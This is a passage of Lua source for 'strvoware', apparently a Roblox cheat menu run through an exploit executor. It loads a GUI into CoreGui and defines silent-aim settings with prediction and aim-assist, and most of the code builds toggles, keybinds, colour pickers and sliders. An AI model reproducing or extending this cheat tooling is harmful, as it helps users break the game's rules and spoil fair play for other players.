
local inputService   = game:GetService("UserInputService")
local runService     = game:GetService("RunService")
local tweenService   = game:GetService("TweenService")
local players        = game:GetService("Players")
local localPlayer    = players.LocalPlayer
local mouse          = localPlayer:GetMouse()

local strvo           = game:GetObjects("rbxassetid://12705540680")[1]
strvo.bg.Position     = UDim2.new(0.5,-strvo.bg.Size.X.Offset/2,0.5,-strvo.bg.Size.Y.Offset/2)
strvo.Parent          = game:GetService("CoreGui")
strvo.bg.pre.Text = '<font color="#FFFFF2">strvoware</font> - <font color="#FF0001">Version 2.6.7</font>'

local library = {cheatname = "strvoware";ext = "";gamename = "";colorpicking = false;tabbuttons = {};tabs = {};options = {};flags = {};scrolling = false;notifyText = Drawing.new("Text");playing = false;multiZindex = 200;toInvis = {};libColor = Color3.fromRGB(69, 23, 255);disabledcolor = Color3.fromRGB(233, 0, 0);blacklisted = {Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.UserInputType.MouseMovement}}

function draggable(a)local b=inputService;local c;local d;local e;local f;local function g(h)if not library.colorpicking then local i=h.Position-e;a.Position=UDim2.new(f.X.Scale,f.X.Offset+i.X,f.Y.Scale,f.Y.Offset+i.Y)end end;a.InputBegan:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseButton1 or h.UserInputType==Enum.UserInputType.Touch then c=true;e=h.Position;f=a.Position;h.Changed:Connect(function()if h.UserInputState==Enum.UserInputState.End then c=false end end)end end)a.InputChanged:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseMovement or h.UserInputType==Enum.UserInputType.Touch then d=h end end)b.InputChanged:Connect(function(h)if h==d and c then g(h)end end)end
draggable(strvo.bg)

local tabholder = strvo.bg.bg.bg.bg.main.group
local tabviewer = strvo.bg.bg.bg.bg.tabbuttons

--// Modules
local Connections     = {};
local Loops           = {};
local GameFramework   = {};
local VisualsModule   = {};
local Notifications   = {};
local Utility         = {};
local Combat          = {};
local CustomObjects   = {};
local CommandBar      = {};
local Commands        = {};
local Flags           = {};
local PlayerFunctions = {};
local Seats           = {};
local Configs         = {};

local Camera = workspace.CurrentCamera

inputService.InputEnded:Connect(function(key)
    if key.KeyCode == Enum.KeyCode.RightShift then
        strvo.Enabled = not strvo.Enabled
        library.scrolling = false
        library.colorpicking = false
        for i,v in next, library.toInvis do
            v.Visible = false
        end
    end
end)
local Client = game.Players.LocalPlayer;
local keyNames = {
    [Enum.KeyCode.LeftAlt] = 'LALT';
    [Enum.KeyCode.RightAlt] = 'RALT';
    [Enum.KeyCode.LeftControl] = 'LCTRL';
    [Enum.KeyCode.RightControl] = 'RCTRL';
    [Enum.KeyCode.LeftShift] = 'LSHIFT';
    [Enum.KeyCode.RightShift] = 'RSHIFT';
    [Enum.KeyCode.Underscore] = '_';
    [Enum.KeyCode.Minus] = '-';
    [Enum.KeyCode.Plus] = '+';
    [Enum.KeyCode.Period] = '.';
    [Enum.KeyCode.Slash] = '/';
    [Enum.KeyCode.BackSlash] = '\\';
    [Enum.KeyCode.Question] = '?';
    [Enum.UserInputType.MouseButton1] = 'MB1';
    [Enum.UserInputType.MouseButton2] = 'MB2';
    [Enum.UserInputType.MouseButton3] = 'MB3';
}

local silent = {
    target = nil,
    cf = nil,
    key = Enum.KeyCode.E,
    hl = true,
    friend = true,
    visible = true,
    distance = true,
    dist = 150,
    on = true,
    assist = false,
    assistv = 0.058,
    pred = 0.013,
    mode = "FOV",
    part = "HumanoidRootPart",
    fov = {
        visible = false,
        size = 15,
    },
}
local shared = {
    drawings = {},
    connections = {},
    hidden_connections = {},
    pointers = {},
    theme = {
        inline = Color3.fromRGB(6, 6, 6),
        dark = Color3.fromRGB(24, 24, 24),
        text = Color3.fromRGB(255, 255, 255),
        section = Color3.fromRGB(150, 150, 150),
        accent = Color3.fromRGB(255, 35, 35)
    },
    accents = {},
    moveKeys = {
        ["Movement"] = {
            ["Up"] = "Up",
            ["Down"] = "Down"
        },
        ["Action"] = {
            ["Return"] = "Enter",
            ["Left"] = "Left",
            ["Right"] = "Right"
        }
    },
    keys = {"C","X","E","Q","F","Z"},
    allowedKeyCodes = {"Q","E","R","T","Y","U","I","O","P","F","G","H","J","K","L","Z","X","C","V","B","N","M","One","Two","Three","Four","Five","Six","Seveen","Eight","Nine","0","Insert","Tab","Home","End","LeftAlt","LeftControl","LeftShift","RightAlt","RightControl","RightShift"},
    allowedInputTypes = {"MouseButton1","MouseButton2","MouseButton3"},
    shortenedInputs = {["MouseButton1"] = "MB1", ["MouseButton2"] = "MB2", ["MouseButton3"] = "MB3", ["Insert"] = "Ins", ["LeftAlt"] = "LAlt", ["LeftControl"] = "LCtrl", ["LeftShift"] = "LShift", ["RightAlt"] = "RAlt", ["RightControl"] = "RCtrl", ["RightShift"] = "RShift", ["CapsLock"] = "Caps"},
    colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 100, 0), Color3.fromRGB(255, 200, 0), Color3.fromRGB(210, 255, 0), Color3.fromRGB(110, 255, 0), Color3.fromRGB(10, 255, 0), Color3.fromRGB(0, 255, 90), Color3.fromRGB(0, 255, 190), Color3.fromRGB(0, 220, 255), Color3.fromRGB(0, 120, 255), Color3.fromRGB(0, 20, 255), Color3.fromRGB(80, 0, 255), Color3.fromRGB(180, 0, 255), Color3.fromRGB(255, 0, 230), Color3.fromRGB(255, 0, 130), Color3.fromRGB(255, 255, 255), Color3.fromRGB(0, 0, 0)},
    toggleKey = {Enum.KeyCode.Insert, true}
}

library.notifyText.Font = 0
library.notifyText.Size = 0
library.notifyText.Outline = false
library.notifyText.Color = Color3.new(1,1,1)
library.notifyText.Position = Vector2.new(10,60)

function library:Tween(...)
    tweenService:Create(...):Play()
end

function library:notify(text)
    if playing then return end
    playing = true
    library.notifyText.Text = text
    library.notifyText.Transparency = 1
    library.notifyText.Visible = true
    for i = 0,1,0.1 do wait()
        library.notifyText.Transparency = i
    end
    spawn(function()
        wait(3)
        for i = 1,0,-0.1 do wait()
            library.notifyText.Transparency = i
        end
        playing = false
        library.notifyText.Visible = false
    end)
end

function library:addTab(name)
    local newTab = tabholder.tab:Clone()
    local newButton = tabviewer.button:Clone()

    table.insert(library.tabs,newTab)
    newTab.Parent = tabholder
    newTab.Visible = false

    table.insert(library.tabbuttons,newButton)
    newButton.Parent = tabviewer
    newButton.Modal = true
    newButton.Visible = true
    newButton.text.Text = name
    newButton.MouseButton1Click:Connect(function()
        for i,v in next, library.tabs do
            v.Visible = v == newTab
        end
        for i,v in next, library.toInvis do
            v.Visible = false
        end
        for i,v in next, library.tabbuttons do
            local state = v == newButton
            if state then
                v.element.Visible = true
                library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
                v.text.TextColor3 = Color3.fromRGB(244, 244, 244)
            else
                library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})
                v.text.TextColor3 = Color3.fromRGB(144, 144, 144)
            end
        end
    end)

    local tab = {}
    local groupCount = 0
    local jigCount = 0
    local topStuff = 2000
  
    function tab:createGroup(pos,groupname) -- newTab[pos == 0 and "left" or "right"] 
        local groupbox = Instance.new("Frame")
        local grouper = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local UIPadding = Instance.new("UIPadding")
        local element = Instance.new("Frame")
        local title = Instance.new("TextLabel")
        local backframe = Instance.new("Frame")

        groupCount -= 1

        groupbox.Parent = newTab[pos]
        groupbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        groupbox.BorderColor3 = Color3.fromRGB(7, 234, 242)
        groupbox.BorderSizePixel = 2
        groupbox.Size = UDim2.new(0, 215, 0, 8)
        groupbox.ZIndex = groupCount

        grouper.Parent = groupbox
        grouper.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        grouper.BorderColor3 = Color3.fromRGB(0, 0, 0)
        grouper.Size = UDim2.new(1, 0, 1, 0)

        UIListLayout.Parent = grouper
        UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        UIPadding.Parent = grouper
        UIPadding.PaddingBottom = UDim.new(0, 4)
        UIPadding.PaddingTop = UDim.new(0, 7)

        element.Name = "element"
        element.Parent = groupbox
        element.BackgroundColor3 = library.libColor
        element.BorderSizePixel = 0
        element.Size = UDim2.new(1, 0, 0, 1)

        title.Parent = groupbox
        title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        title.BackgroundTransparency = 1.000
        title.BorderSizePixel = 0
        title.Position = UDim2.new(0, 17, 0, 0)
        title.ZIndex = 2
        title.Font = Enum.Font.Code
        title.Text = groupname or ""
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextSize = 13.000
        title.TextStrokeTransparency = 0.000
        title.TextXAlignment = Enum.TextXAlignment.Left

        backframe.Parent = groupbox
        backframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        backframe.BorderSizePixel = 0
        backframe.Position = UDim2.new(0, 10, 0, -2)
        backframe.Size = UDim2.new(0, 13 + title.TextBounds.X, 0, 3)

        local group = {}
        function group:addToggle(args)
            if not args.flag and args.text then args.flag = args.text end
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on recent toggle") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)

            local toggleframe = Instance.new("Frame")
            local tobble = Instance.new("Frame")
            local mid = Instance.new("Frame")
            local front = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local button = Instance.new("TextButton")

            jigCount -= 1
            library.multiZindex -= 1

            toggleframe.Name = "toggleframe"
            toggleframe.Parent = grouper
            toggleframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            toggleframe.BackgroundTransparency = 1.000
            toggleframe.BorderSizePixel = 0
            toggleframe.Size = UDim2.new(1, 0, 0, 20)
            toggleframe.ZIndex = library.multiZindex
            
            tobble.Name = "tobble"
            tobble.Parent = toggleframe
            tobble.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            tobble.BorderColor3 = Color3.fromRGB(0, 0, 0)
            tobble.BorderSizePixel = 3
            tobble.Position = UDim2.new(0.0299999993, 0, 0.272000015, 0)
            tobble.Size = UDim2.new(0, 10, 0, 10)
            
            mid.Name = "mid"
            mid.Parent = tobble
            mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
            mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
            mid.BorderSizePixel = 2
            mid.Size = UDim2.new(0, 10, 0, 10)
            
            front.Name = "front"
            front.Parent = mid
            front.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            front.BorderColor3 = Color3.fromRGB(0, 0, 0)
            front.Size = UDim2.new(0, 10, 0, 10)
            
            text.Name = "text"
            text.Parent = toggleframe
            text.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0, 22, 0, 0)
            text.Size = UDim2.new(0, 0, 1, 2)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(155, 155, 155)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left
            
            button.Name = "button"
            button.Parent = toggleframe
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(0, 101, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            if args.disabled then
                button.Visible = false
                text.TextColor3 = library.disabledcolor
                text.Text = args.text
            return end

            local state = false
            function toggle(newState)
                state = newState
                library.flags[args.flag] = state
                front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(35, 35, 35)
                text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                if args.callback then
                    args.callback(state)
                end
            end
            button.MouseButton1Click:Connect(function()
                state = not state
                front.Name = state and "accent" or "back"
                library.flags[args.flag] = state
                mid.BorderColor3 = Color3.fromRGB(60,60, 60)
                front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(35, 35, 35)
                text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                if args.callback then
                    args.callback(state)
                end
            end)
            button.MouseEnter:connect(function()
                mid.BorderColor3 = library.libColor
			end)
            button.MouseLeave:connect(function()
                mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)

            library.flags[args.flag] = false
            library.options[args.flag] = {type = "toggle",changeState = toggle,skipflag = args.skipflag,oldargs = args}
            local toggle = {}
            function toggle:addKeybind(args)
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
                local next = false
                
                local keybind = Instance.new("Frame")
                local button = Instance.new("TextButton")

                keybind.Parent = toggleframe
                keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                keybind.BackgroundTransparency = 1.000
                keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
                keybind.BorderSizePixel = 0
                keybind.Position = UDim2.new(0.720000029, 4, 0.272000015, 0)
                keybind.Size = UDim2.new(0, 51, 0, 10)
                
                button.Parent = keybind
                button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Position = UDim2.new(-0.270902753, 0, 0, 0)
                button.Size = UDim2.new(1.27090275, 0, 1, 0)
                button.Font = Enum.Font.Code
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(155, 155, 155)
                button.TextSize = 13.000
                button.TextStrokeTransparency = 0.000
                button.TextXAlignment = Enum.TextXAlignment.Right
    
                function updateValue(val)
                    if library.colorpicking then return end
                    library.flags[args.flag] = val
                    button.Text = keyNames[val] or val.Name
                end
                inputService.InputBegan:Connect(function(key)
                    local key = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                    if next then
                        if not table.find(library.blacklisted,key) then
                            next = false
                            library.flags[args.flag] = key
                            button.Text = keyNames[key] or key.Name
                            button.TextColor3 = Color3.fromRGB(155, 155, 155)
                        end
                    end
                    if not next and key == library.flags[args.flag] and args.callback then
                        args.callback()
                    end
                end)
    
                button.MouseButton1Click:Connect(function()
                    if library.colorpicking then return end
                    library.flags[args.flag] = Enum.KeyCode.Unknown
                    button.Text = "--"
                    button.TextColor3 = library.libColor
                    next = true
                end)
    
                library.flags[args.flag] = Enum.KeyCode.Unknown
                library.options[args.flag] = {type = "keybind",changeState = updateValue,skipflag = args.skipflag,oldargs = args}
    
                updateValue(args.key or Enum.KeyCode.Unknown)
            end
            function toggle:addColorpicker(args)
                if not args.flag and args.text then args.flag = args.text end
                local colorpicker = Instance.new("Frame")
                local mid = Instance.new("Frame")
                local front = Instance.new("Frame")
                local button2 = Instance.new("TextButton")
                local colorFrame = Instance.new("Frame")
                local colorFrame_2 = Instance.new("Frame")
                local hueframe = Instance.new("Frame")
                local main = Instance.new("Frame")
                local hue = Instance.new("ImageLabel")
                local pickerframe = Instance.new("Frame")
                local main_2 = Instance.new("Frame")
                local picker = Instance.new("ImageLabel")
                local clr = Instance.new("Frame")
                local copy = Instance.new("TextButton")

                library.multiZindex -= 1
                jigCount -= 1
                topStuff -= 1 --args.second

                colorpicker.Parent = toggleframe
                colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                colorpicker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                colorpicker.BorderSizePixel = 3
                colorpicker.Position = args.second and UDim2.new(0.720000029, 4, 0.272000015, 0) or UDim2.new(0.860000014, 4, 0.272000015, 0)
                colorpicker.Size = UDim2.new(0, 20, 0, 10)
                
                mid.Name = "mid"
                mid.Parent = colorpicker
                mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
                mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
                mid.BorderSizePixel = 2
                mid.Size = UDim2.new(1, 0, 1, 0)
                
                front.Name = "front"
                front.Parent = mid
                front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
                front.BorderColor3 = Color3.fromRGB(0, 0, 0)
                front.Size = UDim2.new(1, 0, 1, 0)
                
                button2.Name = "button2"
                button2.Parent = front
                button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button2.BackgroundTransparency = 1.000
                button2.Size = UDim2.new(1, 0, 1, 0)
                button2.Text = ""
                button2.Font = Enum.Font.SourceSans
                button2.TextColor3 = Color3.fromRGB(0, 0, 0)
                button2.TextSize = 14.000

				colorFrame.Name = "colorFrame"
				colorFrame.Parent = toggleframe
				colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				colorFrame.BorderSizePixel = 2
				colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
				colorFrame.Size = UDim2.new(0, 137, 0, 128)

				colorFrame_2.Name = "colorFrame"
				colorFrame_2.Parent = colorFrame
				colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
				colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

				hueframe.Name = "hueframe"
				hueframe.Parent = colorFrame_2
				hueframe.Parent = colorFrame_2
                hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                hueframe.BorderSizePixel = 2
                hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
                hueframe.Size = UDim2.new(0, 100, 0, 100)
    
                main.Name = "main"
                main.Parent = hueframe
                main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main.Size = UDim2.new(0, 100, 0, 100)
                main.ZIndex = 6
    
                picker.Name = "picker"
                picker.Parent = main
                picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
                picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                picker.BorderSizePixel = 0
                picker.Size = UDim2.new(0, 100, 0, 100)
                picker.ZIndex = 104
                picker.Image = "rbxassetid://2615689005"
    
                pickerframe.Name = "pickerframe"
                pickerframe.Parent = colorFrame
                pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                pickerframe.BorderSizePixel = 2
                pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
                pickerframe.Size = UDim2.new(0, 20, 0, 100)
    
                main_2.Name = "main"
                main_2.Parent = pickerframe
                main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main_2.Size = UDim2.new(0, 20, 0, 100)
                main_2.ZIndex = 6
    
                hue.Name = "hue"
                hue.Parent = main_2
                hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
                hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                hue.BorderSizePixel = 0
                hue.Size = UDim2.new(0, 20, 0, 100)
                hue.ZIndex = 104
                hue.Image = "rbxassetid://2615692420"
    
                clr.Name = "clr"
                clr.Parent = colorFrame
                clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                clr.BackgroundTransparency = 1.000
                clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
                clr.BorderSizePixel = 2
                clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
                clr.Size = UDim2.new(0, 129, 0, 14)
                clr.ZIndex = 5
    
                copy.Name = "copy"
                copy.Parent = clr
                copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                copy.BackgroundTransparency = 1.000
                copy.BorderSizePixel = 0
                copy.Size = UDim2.new(0, 129, 0, 14)
                copy.ZIndex = 5
                copy.Font = Enum.Font.SourceSans
                copy.Text = args.text or args.flag
                copy.TextColor3 = Color3.fromRGB(100, 100, 100)
                copy.TextSize = 14.000
                copy.TextStrokeTransparency = 0.000

                copy.MouseButton1Click:Connect(function() -- "  "..args.text or "  "..args.flag
                    colorFrame.Visible = false
                end)

                button2.MouseButton1Click:Connect(function()
                    colorFrame.Visible = not colorFrame.Visible
                    mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
                end)

                button2.MouseEnter:connect(function()
                    mid.BorderColor3 = library.libColor
                end)
                button2.MouseLeave:connect(function()
                    mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
                end)

                local function updateValue(value,fakevalue)
                    if typeof(value) == "table" then value = fakevalue end
                    library.flags[args.flag] = value
                    front.BackgroundColor3 = value
                    if args.callback then
                        args.callback(value)
                    end
                end

                local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
                local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
                local heartbeat = game:GetService("RunService").Heartbeat

                local pickerX,pickerY,hueY = 0,0,0
                local oldpercentX,oldpercentY = 0,0

                hue.MouseEnter:Connect(function()
                    local input = hue.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                                local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                                local startC = colors[math.floor(num)]
                                local endC = colors[math.ceil(num)]
                                local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                                picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                                updateValue(color)
                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = hue.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                picker.MouseEnter:Connect(function()
                    local input = picker.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                                local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                                local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                                updateValue(color)
                                oldpercentX,oldpercentY = xPercent,yPercent
                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = picker.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                hue.MouseMoved:connect(function(_, y)
                    hueY = y
                end)

                picker.MouseMoved:connect(function(x, y)
                    pickerX,pickerY = x,y
                end)

                table.insert(library.toInvis,colorFrame)
                library.flags[args.flag] = Color3.new(1,1,1)
                library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

                updateValue(args.color or Color3.new(1,1,1))
            end
            return toggle
        end
        function group:addButton(args)
            if not args.callback or not args.text then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 22)

            local buttonframe = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")
            local button = Instance.new("TextButton")
            local gradient = Instance.new("UIGradient")

            buttonframe.Name = "buttonframe"
            buttonframe.Parent = grouper
            buttonframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            buttonframe.BackgroundTransparency = 1.000
            buttonframe.BorderSizePixel = 0
            buttonframe.Size = UDim2.new(1, 0, 0, 21)
            
            bg.Name = "bg"
            bg.Parent = buttonframe
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.0299999993, -1, 0.140000001, 0)
            bg.Size = UDim2.new(0, 205, 0, 15)
            
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            
            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(1, 0, 1, 0)
            button.Font = Enum.Font.Code
            button.Text = args.text or args.flag
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.TextSize = 13.000
            button.TextStrokeTransparency = 0.000
            
            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(171, 171, 171))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            button.MouseButton1Click:Connect(function()
                if not library.colorpicking then
                    args.callback()
                end
            end)
            button.MouseEnter:connect(function()
                main.BorderColor3 = library.libColor
			end)
			button.MouseLeave:connect(function()
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)
        end
        function group:addSlider(args)
            print(args, args.flag, args.max)
            groupbox.Size += UDim2.new(0, 0, 0, 30)

            local slider = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")
            local fill = Instance.new("Frame")
            local button = Instance.new("TextButton")
            local valuetext = Instance.new("TextLabel")
            local UIGradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")

            slider.Name = "slider"
            slider.Parent = grouper
            slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            slider.BackgroundTransparency = 1.000
            slider.BorderSizePixel = 0
            slider.Size = UDim2.new(1, 0, 0, 30)
            
            bg.Name = "bg"
            bg.Parent = slider
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.0299999993, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 10)
            
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(7, 234, 242)
            main.BorderColor3 = Color3.fromRGB(7, 234, 242)
            main.Size = UDim2.new(1, 0, 1, 0)
            
            fill.Name = "fill"
            fill.Parent = main
            fill.BackgroundColor3 = library.libColor
            fill.BackgroundTransparency = 0.200
            fill.BorderColor3 = Color3.fromRGB(60, 60, 60)
            fill.BorderSizePixel = 0
            fill.Size = UDim2.new(0.617238641, 13, 1, 0)
            
            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 191, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000
            
            valuetext.Parent = main
            valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.BackgroundTransparency = 1.000
            valuetext.Position = UDim2.new(0.5, 0, 0.5, 0)
            valuetext.Font = Enum.Font.Code
            valuetext.Text = "0.9172/10"
            valuetext.TextColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.TextSize = 14.000
            valuetext.TextStrokeTransparency = 0.000
            
            UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(113, 113, 113))}
            UIGradient.Rotation = 90
            UIGradient.Parent = main
            
            text.Name = "text"
            text.Parent = slider
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left

            local entered = false
			local scrolling = false
			local amount = 0

            local function updateValue(value)
                if library.colorpicking then return end
				if value ~= 0 then
					fill:TweenSize(UDim2.new(value/args.max,0,1,0),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.01)
				else
					fill:TweenSize(UDim2.new(0,1,1,0),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.01)
                end
                valuetext.Text = tostring(value )
                library.flags[args.flag] = value
                if args.callback then
                    args.callback(value)
                end
			end
			local function updateScroll()
                if scrolling or library.scrolling or not newTab.Visible or library.colorpicking then return end
                while inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and strvo.Enabled do runService.RenderStepped:Wait()
                    library.scrolling = true
                    valuetext.TextColor3 = Color3.fromRGB(255,255,255)
					scrolling = true
					local value = args.min + ((mouse.X - button.AbsolutePosition.X) / button.AbsoluteSize.X) * (args.max - args.min)
					if value < 0 then value = 0 end
					if value > args.max then value = args.max end
                    if value < args.min then value = args.min end
					updateValue(math.floor(value))
                end
                if scrolling and not entered then
                    valuetext.TextColor3 = Color3.fromRGB(255,255,255)
                end
                if not strvo.Enabled then
                    entered = false
                end
                scrolling = false
                library.scrolling = false
			end
			button.MouseEnter:connect(function()
                if library.colorpicking then return end
				if scrolling or entered then return end
                entered = true
                main.BorderColor3 = library.libColor
				while entered do wait()
					updateScroll()
				end
			end)
			button.MouseLeave:connect(function()
                entered = false
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)
            if args.value then
                updateValue(args.value)
            end
            library.flags[args.flag] = 0
